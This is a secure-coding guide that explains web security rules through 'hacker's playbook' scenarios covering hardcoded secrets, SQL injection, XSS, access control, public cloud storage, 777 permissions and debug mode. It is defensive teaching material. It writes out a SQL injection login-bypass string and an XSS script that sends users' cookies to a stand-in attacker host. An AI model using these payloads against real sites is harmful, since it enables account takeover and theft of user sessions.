# VibeCoding Security Guidelines Explained: Why We Insist So Much?

This document explains the importance of each rule in the "Security Guidelines". Understanding these will help you view your code from a "hacker's perspective" and prevent problems before they occur.

---

## ⭐ Golden Rules

### 【Never Hardcode Secrets】 & 【Use Environment Variables】 & 【Ignore Secret Files】

**Why is this important?**

These three are the highest survival laws in the digital world. Your code (especially when using Git) will be copied, shared, and stored in multiple places. Writing passwords, API keys, and other "secrets" directly in code is like tattooing your safe's password on your forehead - anyone who sees you (sees the code) can easily open your safe. The `.env` file is your private safe, and `.gitignore` is the security system that ensures this safe won't be accidentally packaged and sent to others.

**Hacker's Playbook 😈**
> I love searching GitHub for `password`, `api_key`, or `db_connect`. I found your public project, and in a file called `config.js`, I saw this code: `const db_password = 'Password123!';`. Perfect! I don't even need to attack your website - I can now directly try to log into your database with this password.

**Disaster Consequences 💥**

**Complete service takeover.** Hackers can steal, tamper with, or delete all your user data, or use your paid API services (e.g., sending mass emails, using map services) for illegal activities, with all bills charged to you.

---

## 📥 Handling User Input

### 【Prevent Injection Attacks (SQL Injection)】

**Why is this important?**

Imagine the database as a robot that only understands SQL language. If you directly concatenate user input with your commands, users have the opportunity to speak their own "commands". Parameterized queries tell the robot: "Listen, the next part is **just data** - no matter what the content is, don't execute it as commands."

**Hacker's Playbook 😈**
> In your website's login box, I entered `' OR '1'='1' --` as the username. I guess your SQL query is written like this: `"SELECT * FROM users WHERE username = '" + userInput + "';"`. My input turned it into `SELECT * FROM users WHERE username = '' OR '1'='1' --';`. `'1'='1'` is always true, so I bypassed password verification and successfully logged into the first user's account (usually the administrator).

**Disaster Consequences 💥**

Attackers can bypass login, steal entire database data (user lists, password hashes), or even delete the database.

### 【Prevent Cross-Site Scripting (XSS)】

**Why is this important?**

If your website is like a mirror that directly reflects user input content, then users can embed malicious JavaScript scripts in the content. When other users browse this content, the malicious script will execute in their browsers, stealing their information. HTML entity encoding converts special characters in malicious scripts (like `<`, `>`) into harmless plain text, making them unable to execute.

**Hacker's Playbook 😈**
> I left a comment in your article comment section: `<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`. This text was stored in the database as-is. Now, any user reading this comment will have their browser automatically execute this script, sending their login cookies to my server. With the cookies, I can impersonate their identity to log into the website.

**Disaster Consequences 💥**

Large-scale user account theft, personal data leakage, websites being implanted with phishing content or mining scripts.

---

## 🔐 Permissions & Authentication

### 【API Endpoint Protection】

**Why is this important?**

Frontend interfaces (UI) can hide buttons, but hackers never rely on interfaces. They will directly call your backend APIs using tools (like Postman, curl). You must assume every API endpoint will be directly attacked, so each endpoint must be an independent guard, checking the visitor's identity and permissions by itself.

**Hacker's Playbook 😈**
> I discovered that to modify personal information, the frontend sends a request to `/api/user/update`. Although I can't see other people's modify buttons, I guess this API might distinguish users through `userId`. I tried sending a request to `/api/user/update?userId=1` (administrator's ID) with the data I want to modify. Oh my, the server didn't check if the request was from me personally and successfully changed the administrator's email!

**Disaster Consequences 💥**

Regular users can tamper with other users' or even administrators' data, or execute permissions they shouldn't have, causing system chaos.

---

## ☁️ External Services & Cloud Integration

### 【External Database Firewall】 & 【Cloud Storage Privatization】

**Why is this important?**

Your cloud database and storage space are like your private warehouse in the cloud. You would never leave your warehouse doors wide open for the whole world to enter. Firewalls and privatization settings create a solid wall and locked door for your warehouse, only allowing your application (specified IP addresses) - this "authorized truck" - to enter and exit.

**Hacker's Playbook 😈**
> I used tools to scan your company's IP range and found an AWS S3 bucket that is "public". I clicked in and saw it was full of ID photos uploaded by your users and scanned company contracts. All file lists were visible at a glance, and I downloaded everything.

**Disaster Consequences 💥**

All stored sensitive data (user personal information, company confidential documents) is stolen in one go, causing devastating data breach incidents.

---

## ⚙️ Files & Server Configuration

### 【Never Use 777】

**Why is this important?**

Permission `777` means "read, write, execute" permissions are open to "owner, group, others" - everyone. This is like leaving your front door unlocked and posting a note saying "Welcome anyone to come in, live, graffiti, throw parties". If hackers can upload a file, `777` permissions give them the power to execute this file.

**Hacker's Playbook 😈**
> I discovered your website's image upload function has a small vulnerability - it doesn't strictly limit the file types I upload. I uploaded a malicious backdoor program called `shell.php`, disguised as `image.jpg.php`. Because your upload directory permissions are `777`, the server allows me to "execute" this file. Now I just need to visit `yoursite.com/uploads/shell.php` to do whatever I want on your server.

**Disaster Consequences 💥**

Complete server compromise. Hackers can steal all code and data, turn your server into a zombie host for launching cyber attacks, or plant ransomware.

### 【Disable Debug Mode】

**Why is this important?**

Debug mode is a great helper during development, but in production environments, it's like a chattering insider. When the website errors, it will completely display extremely sensitive information like server internal paths, database query statements, configuration variables on error pages, essentially providing hackers with a detailed attack map.

**Hacker's Playbook 😈**
> I deliberately entered some special characters in your website's search box to cause program errors. The website immediately returned a detailed error page showing `Error in /var/www/html/app/models/User.php on line 52`, along with the erroring SQL query statement. Now I know your file structure, the programming framework you use, and even the database table names. My next attack will be much more precise.

**Disaster Consequences 💥**

Leaking massive amounts of internal system information, significantly reducing hacker attack difficulty, allowing them to find real vulnerabilities much faster.